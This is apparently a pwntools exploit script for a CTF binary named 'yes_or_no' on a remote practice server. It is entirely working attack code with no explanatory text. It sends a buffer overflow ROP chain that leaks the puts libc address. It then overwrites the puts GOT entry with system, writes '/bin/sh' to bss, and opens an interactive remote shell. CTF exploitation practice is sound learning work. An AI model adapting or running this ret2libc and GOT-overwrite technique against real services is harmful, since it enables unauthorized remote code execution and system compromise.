from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3009)
e = ELF("./yes_or_no")
libc = ELF("./libc-2.27.so")

script = '''
b *main + 271
b *main + 323
b *main + 266
'''
#gdb.attach(p, script)

bss = e.bss()

pop_rdi_r = 0x400883            # pop rdi; ret
pop_rsi_pop_r = 0x400881        # pop rsi; pop r15; ret
ret = 0x40056e                  # ret

main_before_gets = 0x4007cc     # <main + 261>

puts_plt = e.plt['puts']
puts_got = e.got['puts']
gets_plt = e.plt['gets']


puts_libc = libc.symbols['puts']
system_libc = libc.symbols['system']
binsh_libc = list(libc.search("/bin/sh"))[0]


log.info(p.recvline())
p.sendline("9830400")
log.info(p.recvline())

#========================payload================================== 
payload  = "A" * (0x12 + 0x8)
payload += p64(pop_rdi_r)       # puts address :LEAK:
payload += p64(puts_got)
payload += p64(puts_plt)

payload += p64(pop_rdi_r)       # got overwrite puts--->system     
payload += p64(puts_got)
payload += p64(gets_plt)

payload += p64(pop_rdi_r)       # write "/bin/sh" to bss
payload += p64(bss)
payload += p64(gets_plt)

payload += p64(pop_rdi_r)
payload += p64(bss)
payload += p64(puts_plt)
#==================================================================
#raw_input()

p.sendline(payload)

puts_addr = p.recvline()[:6] + "\x00\x00"
log.info(hex(u64(puts_addr)))

system_offset = libc.symbols['puts'] - libc.symbols['system']
system = u64(puts_addr) - system_offset

p.sendline(p64(system))         # got overwrite system <--- puts
p.sendline("/bin//sh")
log.success("END?")

p.interactive()
